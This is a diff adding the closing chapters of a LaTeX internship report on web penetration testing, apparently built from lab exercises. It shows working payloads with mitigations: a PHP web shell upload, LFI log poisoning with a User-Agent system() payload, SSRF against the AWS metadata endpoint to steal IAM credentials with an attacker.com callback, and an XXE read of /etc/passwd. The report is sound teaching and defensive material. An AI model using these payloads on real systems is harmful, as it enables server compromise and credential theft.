+    \item \textbf{Execution (Upload and Trigger):} The attacker uploads the crafted \texttt{shell.php.jpg} file through the application's profile picture upload feature. Assuming the bypass technique works, the upload is successful. The attacker then navigates to the public URL where the file was uploaded (e.g., \texttt{http://example.com/uploads/shell.php.jpg}) using their browser. This HTTP request triggers the web server to execute the PHP code within the uploaded file.
+\end{enumerate}
+
+\subsection{Result}
+Upon accessing the malicious \texttt{shell.php.jpg} URL, the PHP code embedded within is executed by the web server. The web shell now becomes active. The attacker can append commands to the URL (e.g., \texttt{http://example.com/uploads/shell.php.jpg?cmd=id}) to execute them on the server and view the output directly in their browser.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{figures/file_upload1.png}
+    \caption{Web shell file upload to server.}
+    \label{fig:web-shell-result}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{figures/file_upload2.png}
+    \caption{Web shell exploiting using id command.}
+    \label{fig:web-shell-result}
+\end{figure}
+
+
+\subsection{Mitigation Strategy}
+Securing file upload functionality requires a multi-layered, defense-in-depth approach, as attackers can often bypass single filters.
+\begin{itemize}
+    \item \textbf{Store Files Outside the Web Root:} This is the most effective control. Uploaded files should ideally be stored in a directory that is not publicly accessible via a URL. The application can then serve them securely through a dedicated script, after validating access rights, ensuring they are never executed by the web server.
+    \item \textbf{Use a Strict Extension Allow-List:} Never rely on a block-list (blacklist) of known bad extensions, as it's impossible to account for all malicious file types or bypass techniques. Instead, maintain a strict \textbf{allow-list (whitelist)} of only the safe file extensions explicitly required by the business logic (e.g., \texttt{.jpg}, \texttt{.png}, \texttt{.pdf}).
+    \item \textbf{Rename Uploaded Files:} Upon successful upload and validation, discard the user-supplied filename. Rename the file to a cryptographically strong, random, and unpredictable string (e.g., a UUID) and append a validated, safe extension (e.g., \texttt{12345678-ABCD-1234-EFGH-1234567890AB.jpg}).
+    \item \textbf{Validate File Content Rigorously:} Do not trust the \texttt{Content-Type} header from the client, as it is easily forged. For image uploads, use a server-side image processing library (like GD for PHP, ImageMagick) to parse, validate, re-process, and re-save the image. This process inherently validates the file as a true image and will strip any embedded malicious code or headers (e.g., GIF magic bytes).
+    \item \textbf{Set Secure Directory Permissions:} Ensure the final upload directory is configured with no execute permissions (\texttt{-x}). Also, serve files with a generic \texttt{Content-Type} header (like \texttt{application/octet-stream}) to prevent browsers from attempting to execute them based on assumed types.
+\end{itemize}
+
+\section{Scenario 4: Local File Inclusion (LFI) - Log Poisoning for RCE}
+\subsection{The Challenge}
+A web application uses a parameter (\texttt{file}) to dynamically include content. Initial reconnaissance suggests the application is running on an Apache web server with PHP. The objective is to leverage this LFI vulnerability to gain Remote Code Execution (RCE) via Apache log poisoning.
+
+\subsection{Attack Walkthrough}
+\begin{enumerate}
+    \item \textbf{Vulnerability Identification (Path Traversal):} The attacker tests the file inclusion parameter. By attempting to access a common system file using path traversal sequences (e.g., \texttt{?file=../../../../etc/passwd}), the application successfully returns the content of \texttt{/etc/passwd}. This confirms an LFI vulnerability.
+    \item \textbf{Log Poisoning Payload Crafting:} The attacker identifies a log file that the web server process has read/write access to and that gets accessed when the application is requested (e.g., Apache \texttt{access.log} at \texttt{/var/log/apache2/access.log}). They then craft a malicious PHP payload to inject into this log file, typically embedded in a part of the HTTP request that gets logged (e.g., the \texttt{User-Agent} header).
+    \begin{lstlisting}[language=http, caption={Injecting a PHP payload into server logs via User-Agent.}, label={lst:log-poison-payload-ex4}]
+GET / HTTP/1.1
+Host: example.com
+User-Agent: <?php system($_GET['cmd']); ?>
+\end{lstlisting}
+    The attacker makes an HTTP request to any page on the vulnerable web application, ensuring this malicious \texttt{User-Agent} is included. This request is logged in Apache's \texttt{access.log}.
+    \item \textbf{LFI for RCE:} With the malicious PHP code now residing in the \texttt{access.log}, the attacker uses the LFI vulnerability to include this log file.
+    \begin{lstlisting}[language=http, caption={LFI to execute poisoned log file.}, label={lst:lfi-rce-execution}]
+GET /index.php?file=../../../../var/log/apache2/access.log&cmd=id HTTP/1.1
+Host: example.com
+\end{lstlisting}
+    The LFI vulnerability forces the PHP interpreter to process the \texttt{access.log}. When it encounters the \texttt{<?php ... ?>} tags, it executes the PHP code.
+\end{enumerate}
+
+\subsection{Result}
+The server executes the \texttt{id} command passed via the \texttt{cmd} \texttt{GET} parameter. The output of the command (e.g., \texttt{uid=33(www-data) gid=33(www-data)}) is directly embedded within the application's HTTP response, confirming Remote Code Execution as the web server's user (\texttt{www-data}). This allows for full server compromise.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/log1.png}
+    \caption{Poisoning Hostname with php malicious code.}
+    \label{fig:lfi-log-poisoning}
+\end{figure}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/log2.png}
+    \caption{Successful logs injection.}
+    \label{fig:lfi-log-poisoning}
+\end{figure}
+
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/log3.png}
+    \caption{Output of \texttt{id} command via LFI Log Poisoning RCE.}
+    \label{fig:lfi-log-poisoning}
+\end{figure}
+
+\subsection{Mitigation Strategy}
+LFI vulnerabilities are fundamental and preventable with strict controls.
+\begin{itemize}
+    \item \textbf{Avoid User Input in File Inclusion:} The most robust defense is to completely avoid passing user-supplied input directly or indirectly to any filesystem or \texttt{include()}/\texttt{require()} functions.
+    \item \textbf{Strict Allow-List for File Names:} If dynamic file inclusion is absolutely necessary, use a strict \textbf{allow-list} of only legitimate, hardcoded file names. All other input must be rejected.
+    \item \textbf{Harden Server Logging and Permissions:} Configure web servers not to log potentially malicious input (e.g., parts of the \texttt{User-Agent}) or sanitize logs rigorously. Ensure that log files (and other sensitive files) have restrictive filesystem permissions, preventing the web server process from having write access to its own log files or read access to critical system files outside of its web root.
+\end{itemize}
+
+\section{Scenario 5: Server-Side Request Forgery (SSRF) - Cloud Credential Theft}
+\subsection{The Challenge}
+A web application hosted in an AWS EC2 instance has a feature to generate a PDF from the content of a user-supplied URL. The objective is to exploit a potential Server-Side Request Forgery (SSRF) vulnerability to steal the instance's temporary IAM (Identity and Access Management) credentials.
+
+\subsection{Attack Walkthrough}
+\begin{enumerate}
+    \item \textbf{Vulnerability Identification (URL Submission Feature):} The attacker first identifies the PDF generation feature and its URL input parameter. They test for SSRF by submitting a URL pointing to a service they control (e.g., a Burp Collaborator payload or a simple \texttt{netcat} listener on their attacking machine).
+    Upon submitting this external URL (e.g., \texttt{http://attacker.com:8080}), the attacker observes an out-of-band HTTP request arriving at their service from the web application's server IP address. This confirms the presence of an SSRF vulnerability.
+    \item \textbf{Targeting Cloud Metadata Service (AWS Specific):} The attacker determines that the application is hosted in AWS (e.g., through IP ranges of the web server or distinctive HTTP headers). They know that AWS EC2 instances expose a special instance metadata service endpoint at a well-known, non-routable IP address (\texttt{http://169.254.169.254}). This service provides critical information about the running instance, crucially including temporary access credentials if an IAM role is attached to the instance.
+    \item \textbf{Payload Crafting and Execution:} The attacker needs to identify the \texttt{ROLENAME} first, typically by making an initial SSRF request to \texttt{http://169.254.169.254/
+    latest/meta-data/iam/security-credentials/}. Once the role name is retrieved (e.g., \texttt{EC2\_S3\_Access\_Role}), they construct the final URL to retrieve the credentials. They then submit this URL to the application's PDF generation feature:
+    \begin{lstlisting}[language=http, caption={SSRF payload targeting AWS metadata service for credential theft.}, label={lst:ssrf-aws-payload-ex5}]
+GET /generate-pdf?url=http://169.254.169.254/latest/meta-data/iam/
+security-credentials/ROLENAME HTTP/1.1
+Host: example.com
+\end{lstlisting}
+\end{enumerate}
+
+\subsection{Result}
+The server-side application makes an internal HTTP request to the AWS instance metadata service using the attacker's supplied URL. The response from the metadata service, which contains the temporary \texttt{AccessKeyId}, \texttt{SecretAccessKey}, and \texttt{Token} associated with the EC2 instance's IAM role, is then processed by the PDF generation feature and rendered into the PDF file. This PDF is returned to the attacker, containing the critical cloud credentials.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/ssrf_aws.png}
+    \caption{Exfiltrated AWS credentials obtained via SSRF.}
+    \label{fig:ssrf-aws-practical}
+\end{figure}
+\textbf{Impact:} The attacker now possesses temporary credentials for the AWS environment. Depending on the permissions assigned to the associated IAM role, they can use these credentials with the AWS CLI to potentially access sensitive data in S3 buckets, manage other EC2 instances, or even escalate their privileges within the broader AWS cloud environment, leading to a complete cloud compromise.
+
+\subsection{Mitigation Strategy}
+Preventing SSRF requires rigorous validation of user-supplied URLs and robust network-level controls.
+\begin{itemize}
+    \item \textbf{Strict Allow-List for URLs:} Implement a strict \textbf{allow-list} of the specific domains, IP addresses, and ports that the application is explicitly permitted to connect to. All other requests should be blocked at the application layer. This is the most robust defense.
+    \item \textbf{Block Private and Reserved IP Ranges:} If arbitrary external domains must be allowed, the application should first resolve the user-supplied domain name to an IP address and rigorously check it against a \textbf{block-list (blacklist)} of all private (RFC 1918) and reserved IP ranges (e.g., \texttt{10.0.0.0/8}, \texttt{172.16.0.0/12}, \texttt{192.168.0.0/16}, \texttt{127.0.0.1/8}, and the metadata service IP \texttt{169.254.169.254/32}). This prevents access to internal resources.
+    \item \textbf{Disable Unused URL Schemas:} Configure the application's HTTP client or URL parsing library to only allow safe schemas (\texttt{http}, \texttt{https}). Explicitly disable dangerous schemas like \texttt{file://}, \texttt{gopher://}, \texttt{dict://}).
+    \item \textbf{Network-Level Egress Filtering:} Implement firewall rules on the web server to prevent it from initiating outbound connections to internal network segments or unauthorized external endpoints. This acts as a crucial last line of defense.
+\end{itemize}
+
+\section{Scenario 6: XML External Entity (XXE) - Local File Read}
+\subsection{The Challenge}
+An application uses XML to handle user input for authentication. The objective is to exploit a potential XML External Entity (XXE) vulnerability to read a sensitive local file, such as \texttt{/etc/passwd}.
+
+\subsection{Attack Walkthrough}
+\begin{enumerate}
+    \item \textbf{Vulnerability Identification (XML Input):} The attacker uses a web proxy (like Burp Suite) to intercept a login request to \texttt{/api/login}. The request body is in XML format, for example:
+    \begin{lstlisting}[language=xml, caption={Intercepted XML login request.}, label={lst:xml-login-request-ex6}]
+<?xml version="1.0" encoding="UTF-8"?><root><email>user@example.com</email><password>password123</password></root>
+    \end{lstlisting}
+    \item \textbf{XXE Payload Crafting (DTD \& Entity):} The attacker modifies the XML request by adding a \texttt{DOCTYPE} declaration that defines an external entity. This entity (\texttt{xxe}) will be instructed to read \texttt{/etc/passwd} using the \texttt{file:///} URI scheme. The modified request then uses this entity (\texttt{\&xxe;}) within an element (e.g., \texttt{<email>}).
+    \begin{lstlisting}[language=xml, caption={XXE payload to read local file \texttt{/etc/passwd}.}, label={lst:xxe-payload-ex6}]
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root>
+    <email>&xxe;</email> <!-- Injecting the entity here -->
+    <password>P@ssw0rd123</password>
+</root>
+    \end{lstlisting}
+    \item \textbf{Execution (XML Request):} The attacker sends this modified XML payload to the \texttt{/api/login} endpoint (e.g., via the modified intercepted request in Burp Suite or a \texttt{curl} command). The vulnerable XML parser on the server processes the \texttt{DOCTYPE} declaration and resolves the \texttt{\&xxe;} entity.
+\end{enumerate}
+
+\subsection{Result}
+If the XML parser is vulnerable and configured to support external entities, it resolves the \texttt{\&xxe;} entity by reading the content of \texttt{/etc/passwd}. The server then attempts to process the XML, but since \texttt{/etc/passwd} content (like special characters) is not valid XML for an email, the application will likely throw an error. This error message may inadvertently include the full content of \texttt{/etc/passwd}, directly revealing the file.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=\textwidth]{figures/xxe2.png}
+    \caption{Output of XXE Local File Read.}
+    \label{fig:xxe-file-read}
+\end{figure}
+
+\subsection{Mitigation Strategy}
+The primary mitigation for XXE is to properly configure the XML parser to disable support for external entities.
+\begin{itemize}
+    \item \textbf{Disable External Entities (Parser Configuration):} Configure all XML parsers in the application to explicitly disable the processing of XML External Entities and DTDs. This is typically done by setting specific flags in the parser configuration. Most modern parsers allow this.
+    \item \textbf{Input Validation:} Strictly validate and sanitize all XML input. Reject any XML that contains \texttt{DOCTYPE} declarations if they are not explicitly required by the application's functionality.
+\end{itemize}
+
+\section{Conclusion}
+This chapter translated theory into practice by demonstrating major web vulnerabilities through real exploitation scenarios, including SQL Injection, XSS, file upload and inclusion flaws, RCE, and SSRF. Each case showed how small weaknesses can escalate into severe breaches. Mitigations were presented for every attack, stressing secure coding, strict validation, safe configuration, and layered defenses. The exercises underscored that defense-in-depth and continuous monitoring are essential for building resilient applications and performing effective security assessments.
+\cleardoublepage
+
+
+\cleardoublepage
+
+% --- GENERAL CONCLUSION ---
+\chapter*{General Conclusion}
+\addcontentsline{toc}{chapter}{General Conclusion}
+
+This internship at KEYSTONE provided a profound and practical immersion into the world of web application security. By structuring the project around the systematic analysis of critical vulnerability classes as defined by the OWASP Top 10, it was possible to transition from academic concepts to the tangible application of offensive security techniques. This approach is fundamental to KEYSTONE's mission of securing its clients' digital assets.
+
+The report established a theoretical foundation by detailing the mechanisms and payloads associated with each major web vulnerability. From \textbf{Broken Access Control} exploiting authorization flaws, to \textbf{Cryptographic Failures} undermining data protection, and \textbf{Injection flaws} (SQL, Command, XXE) leveraging interpreters, the intricate nature of these threats was thoroughly examined. Vulnerabilities stemming from \textbf{Insecure Design}, \textbf{Security Misconfiguration}, \textbf{Vulnerable and Outdated Components}, \textbf{Identification and Authentication Failures}, \textbf{Software and Data Integrity Failures}, and \textbf{Server-Side Request Forgery} were systematically broken down, offering a comprehensive view of the modern threat landscape. The exploration of client-side vulnerabilities like \textbf{XSS} and \textbf{CSRF} further completed this panorama, illustrating attacks targeting users and application logic alike.
+
+The core of the project culminated in the \textbf{practical application} of this knowledge. Through a series of detailed attack scenarios, inspired by platforms like Hack The Box, the report demonstrated the real-world impact of exploiting these vulnerabilities. Step-by-step walkthroughs showcased authentication bypasses, web shell deployments, cookie theft, cloud credential exfiltration, and remote code execution. Crucially, each scenario was paired with robust mitigation strategies, moving beyond simple definitions to practical, code-level solutions designed to prevent these attacks. These hands-on exercises were invaluable in bridging the gap between theoretical understanding and practical implementation.
+
+In conclusion, this internship has been an invaluable experience. It has not only solidified my technical skills in web application penetration testing but has also instilled a deeper appreciation for the \enquote{security by design} philosophy. The ability to identify, exploit, and, most importantly, mitigate these critical vulnerabilities is a skill set I have had the privilege to develop under the guidance of experts at KEYSTONE. I look forward to applying this knowledge in my future career, contributing to the development of more resilient and secure web applications.
+
+\cleardoublepage
+
+% --- WEBOGRAPHY ---
+\chapter*{Webography}
+\addcontentsline{toc}{chapter}{Webography}
+
+\begin{itemize}
+    \item \textbf{OWASP Foundation:} The Open Web Application Security Project (OWASP) is a non-profit foundation that works to improve software security.
+    \url{https://owasp.org/}
+
+    \item \textbf{OWASP Top 10:} The OWASP Top 10 is a standard awareness document for web application security.
+    \url{https://owasp.org/www-project-top-ten/}
+
+    \item \textbf{PortSwigger Web Security Academy:} PortSwigger provides an extensive, free online training center for web application security.
+    \url{https://portswigger.net/web-security}
+    
+    \item \textbf{Hack The Box:} A leading cybersecurity training platform offering realistic lab environments.
+    \url{https://www.hackthebox.com/}
+    
+    \item \textbf{SQLMap:} An open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.
+    \url{http://sqlmap.org/}
+
+    \item \textbf{OWASP Adithyan AK Presentation:} A comprehensive guide on Web Application Security Fundamentals.
+    \url{https://owasp.org/www-chapter-coimbatore/assets/files/Web%20Application%20Security%20Adithyan%20AK.pdf}
+\end{itemize}
+
+\end{document}
